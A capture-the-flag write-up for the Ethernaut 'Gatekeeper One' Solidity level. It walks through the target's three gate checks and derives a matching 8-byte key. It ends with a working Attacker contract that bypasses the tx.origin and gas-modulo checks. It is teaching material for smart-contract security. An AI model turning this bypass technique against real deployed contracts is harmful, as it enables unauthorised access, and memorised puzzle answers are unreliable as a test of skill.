# 13. Gatekeeper One

Make it past the gatekeeper and register as an entrant to pass this level.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## Vulnerability

This challenge is more about understanding solidity explicit conversion mechanism than a real vulnerability, given the code (or bytecode) we need to craft a custom `_gatekey` to pass the following checks:

### gateOne

```solidity
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```

This check implies that we must use an intermediary (i.e. Smart contract) to call the target contract.

### gateTwo

```solidity
  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }
```

This check implies that at the moment of the require statement, we must have a multiple of 8191 as leftover gas.

### gateThree

```solidity
  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }
```

This check implies that :

- 1) The value of the last 4 bytes of `_gatekey` must equal the value of the last 2 bytes of `_gatekey`
- 2) The value of the last 4 bytes of `_gatekey` must not equal the value of the last 8 bytes of `_gatekey`
- 3) The value of the last 4 bytes of `_gatekey` must equal the last 2 bytes of `tx.origin`

## Solution

Assuming `tx.origin` equals : `0xE613c2d3D36A7934589BC393119eD33Ac165A596` and that we are sending 8 bytes.

According to 3) `_gatekey` last 4 bytes must be `0x0000A596`.

According to 2) At least one bit from the first 4 bytes of `_gatekey` must be set to 1.

According to 1) bytes 4 and 5 must be set to 0.

The following value fits the conditions : `0x010000000000A596`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {

    bytes8 gateKey = 0x010000000000A596;
    address targetContract;

    event myEvent(uint256);

    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    // Call this function at least 50K gas limit
    function attack() public {
        // 252 is the gas used to reach the GAS instruction in the target contract computed from .call
        // 2 is the cost of the GAS instruction (GAS returns remaining_gas - 2)
        // 10 * 8191 is just to ensure that enough gas is left for further execution 
        targetContract.call{gas: 10 * 8191 + 252 + 2}(abi.encodeWithSignature("enter(bytes8)", gateKey));
    }
    
}
```
